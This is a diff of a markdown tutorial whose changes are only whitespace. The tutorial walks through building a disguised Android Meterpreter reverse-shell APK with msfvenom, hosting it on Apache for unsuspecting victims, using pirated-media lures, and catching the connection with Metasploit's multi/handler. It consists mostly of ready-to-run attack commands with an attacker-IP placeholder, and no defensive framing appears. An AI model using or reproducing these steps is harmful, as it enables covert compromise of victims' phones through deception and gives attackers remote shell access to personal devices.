@@ -8,15 +8,15 @@ We will use a tool ```msfvenom``` to build an apk which will be downloaded on th
 ```msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -o very-useful-app.apk```
 
 ```LHOST``` - The IP of the host who has sent the payload
-```LPORT``` - The listening port for the payload to connect back to the attacker
+```LPORT``` - The listening port for the payload to connect back to the attacker 
 ```-o``` - The name of the resulting apk file generated 
 
 ### Deliver the file to the target device [Android]
 Here we are going the host the the app as a website and whenever the unsuspeting victim browses to the website, they are prompted to download the file. This may be especiallly convincing when the user is trying to download pirated software, video or music. 
 
-```sudo mv very-useful-app.apk /var/www/html```
-```cd var/www/html```
-```service apache2 start```
+```sudo mv very-useful-app.apk /var/www/html``` 
+```cd var/www/html``` 
+```service apache2 start``` 
 
 This starts up a website hosted on our computer itself, which hosts the file. 
 Here is the POV of the victim downloading the apk. 
@@ -27,11 +27,11 @@ Here is the POV of the victim downloading the apk.
 
 As the victim downloads the app we prepare for our next step. We start up Metasploit and select the exploit ```exploit/multi/handler``` and set up the same ```LHOST``` and ```LPORT```. The attacking device will now start listening on port 4444 and wait for connection from the payload.
 
-```msfconsole```
-```use exploit/multi/handler```
-```set LHOST <attacker-IP>```
-```set LPORT 4444```
-```exploit```
+```msfconsole``` 
+```use exploit/multi/handler``` 
+```set LHOST <attacker-IP>``` 
+```set LPORT 4444``` 
+```exploit``` 
 
 Once the phone has installed the app and the victim tries to run it, the payload should activate and we will be given a shell on the android device. During my tests, I found that the target device had to force-start the app via Termux to get a persistent connection, otherwise the app would almost immediately get shut down by the android device. 
 
